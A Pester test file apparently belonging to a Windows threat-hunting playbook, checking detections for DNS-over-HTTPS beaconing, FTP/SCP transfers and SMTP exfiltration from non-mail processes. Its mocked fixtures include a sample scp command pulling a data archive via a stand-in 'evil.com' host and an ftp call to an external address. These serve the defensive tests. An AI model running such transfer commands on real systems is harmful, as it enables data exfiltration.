<#
.SYNOPSIS
    Phase 6 gap-fill tests -- C2 transport and exfil-channel detections.
    All behavior-based: the mechanism (covert transport channel) is the signal.

    P6-6A  DoH beacon        (T1071.004) -- HTTPS to known DoH IPs from non-browser -> High
    P6-6C  FTP/SCP transfer  (T1048.002) -- ftp.exe / scp.exe with external dest -> High
    P6-6D  SMTP exfil        (T1048.003) -- outbound TCP 25/587 from non-mail process -> High
#>

BeforeAll {
    $SrcPath = Join-Path $PSScriptRoot "..\..\playbooks\windows\threat_hunting\dev\src"
    . (Join-Path $SrcPath "00_Parameters_And_Globals.ps1")
    . (Join-Path $SrcPath "06_Network.ps1")
    . (Join-Path $SrcPath "01_Process_And_Injection.ps1")

    function script:Set-P6BaselineMocks {
        Mock Get-Process      { @() }
        Mock Get-CimInstance  { @() }
        Mock Get-NetTCPConnection { @() }
        Mock Get-NamedPipeName    { @() }
        Mock Get-AuthenticodeSignature { [PSCustomObject]@{ Status = 'NotSigned' } }
    }

    function script:New-Conn {
        param([string]$Remote, [int]$RemotePort, [int]$OwnerPid=9001, [string]$State='Established')
        [PSCustomObject]@{ RemoteAddress=$Remote; RemotePort=$RemotePort; LocalPort=54321; OwningProcess=$OwnerPid; State=$State }
    }

    function script:Make-P6Proc {
        param([int]$ProcId=9001, [string]$Name='cmd.exe', [string]$Cmd='', [int]$PPid=4)
        [PSCustomObject]@{ ProcessId=$ProcId; Name=$Name; CommandLine=$Cmd; ParentProcessId=$PPid }
    }
}

# ---------------------------------------------------------------------------
# P6-6A: DoH beacon detection
# Mechanism: DNS-over-HTTPS bypasses DNS cache logging. Direct HTTPS to
# well-known DoH resolver IPs from a non-browser is a C2 beacon indicator.
# ---------------------------------------------------------------------------
Describe "P6-6A DoH Beacon Detection" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P6BaselineMocks
    }

    It "Should flag outbound HTTPS (443) to 1.1.1.1 from a non-browser process as High" {
        $conn = New-Conn -Remote '1.1.1.1' -RemotePort 443 -OwnerPid 9010
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9010; Name='svchost.exe'; ExecutablePath='C:\Windows\System32\svchost.exe' })
        }

        Invoke-NetworkHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'DoH Beacon' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].MITRE    | Should -Match 'T1071'
    }

    It "Should flag outbound HTTPS (443) to 8.8.8.8 from a non-browser as High" {
        $conn = New-Conn -Remote '8.8.8.8' -RemotePort 443 -OwnerPid 9011
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9011; Name='powershell.exe'; ExecutablePath='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' })
        }

        Invoke-NetworkHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'DoH Beacon' }
        $f | Should -HaveCount 1
    }

    It "Should NOT flag browser connecting to 1.1.1.1:443 (normal DoH usage)" {
        $conn = New-Conn -Remote '1.1.1.1' -RemotePort 443 -OwnerPid 9012
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9012; Name='chrome.exe'; ExecutablePath='C:\Program Files\Google\Chrome\Application\chrome.exe' })
        }

        Invoke-NetworkHunt

        ($script:Findings | Where-Object { $_.Type -eq 'DoH Beacon' }) |
            Should -HaveCount 0 -Because "browsers legitimately use DoH"
    }

    It "Should NOT flag non-DoH IP on port 443 (normal HTTPS)" {
        $conn = New-Conn -Remote '142.250.80.100' -RemotePort 443 -OwnerPid 9013
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9013; Name='powershell.exe'; ExecutablePath='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' })
        }

        Invoke-NetworkHunt

        ($script:Findings | Where-Object { $_.Type -eq 'DoH Beacon' }) |
            Should -HaveCount 0 -Because "non-DoH IP on 443 is normal HTTPS traffic"
    }
}

# ---------------------------------------------------------------------------
# P6-6C: FTP / SCP raw transfer detection
# Mechanism: ftp.exe and scp.exe connecting to external IPs is always suspicious
# in enterprise context -- legitimate admin uses VPN-tunnelled management tools.
# ---------------------------------------------------------------------------
Describe "P6-6C FTP/SCP Raw Transfer" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P6BaselineMocks
    }

    It "Should flag ftp.exe connecting to an external IP as High" {
        Mock Get-Process    { @([PSCustomObject]@{ Id=9020; Name='ftp.exe' }) }
        Mock Get-CimInstance {
            @(Make-P6Proc -ProcId 9020 -Name 'ftp.exe' -Cmd 'ftp.exe 203.0.113.50')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }
        Mock Get-NetTCPConnection { @() }
        Mock Get-NamedPipeName    { @() }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Raw File Transfer' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].MITRE    | Should -Match 'T1048'
    }

    It "Should flag scp.exe in a cmdline as High" {
        Mock Get-Process    { @([PSCustomObject]@{ Id=9021; Name='scp.exe' }) }
        Mock Get-CimInstance {
            @(Make-P6Proc -ProcId 9021 -Name 'scp.exe' -Cmd 'scp.exe victim@evil.com:/tmp/data.zip C:\Temp\')
        } -ParameterFilter { $ClassName -eq 'Win32_Process' }
        Mock Get-NetTCPConnection { @() }
        Mock Get-NamedPipeName    { @() }

        Invoke-ProcessHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'Raw File Transfer' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
    }
}

# ---------------------------------------------------------------------------
# P6-6D: SMTP outbound exfiltration
# Mechanism: direct SMTP on port 25/587 from a non-mail process = data exfil
# or credential-based spam relay. Mail clients (Outlook, Thunderbird) are allowed;
# unexpected processes opening SMTP connections are not.
# ---------------------------------------------------------------------------
Describe "P6-6D SMTP Outbound from Non-Mail Process" {

    BeforeEach {
        $script:Findings = @()
        $script:Quiet    = $true
        Set-P6BaselineMocks
    }

    It "Should flag powershell.exe sending to port 25 as High" {
        $conn = New-Conn -Remote '5.6.7.8' -RemotePort 25 -OwnerPid 9030
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9030; Name='powershell.exe'; ExecutablePath='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' })
        }

        Invoke-NetworkHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'SMTP Exfiltration' }
        $f | Should -HaveCount 1
        $f[0].Severity | Should -Be 'High'
        $f[0].MITRE    | Should -Match 'T1048'
    }

    It "Should flag any non-mail process on port 587 as High" {
        $conn = New-Conn -Remote '9.10.11.12' -RemotePort 587 -OwnerPid 9031
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9031; Name='cmd.exe'; ExecutablePath='C:\Windows\System32\cmd.exe' })
        }

        Invoke-NetworkHunt

        $f = $script:Findings | Where-Object { $_.Type -eq 'SMTP Exfiltration' }
        $f | Should -HaveCount 1
    }

    It "Should NOT flag OUTLOOK.EXE connecting to port 587 (legitimate mail client)" {
        $conn = New-Conn -Remote '40.101.80.100' -RemotePort 587 -OwnerPid 9032
        Mock Get-NetTCPConnection {
            if ($State -eq 'Established') { @($conn) } else { @() }
        }
        Mock Get-CimInstance {
            @([PSCustomObject]@{ ProcessId=9032; Name='OUTLOOK.EXE'; ExecutablePath='C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE' })
        }

        Invoke-NetworkHunt

        ($script:Findings | Where-Object { $_.Type -eq 'SMTP Exfiltration' }) |
            Should -HaveCount 0 -Because "Outlook is a legitimate mail client"
    }
}
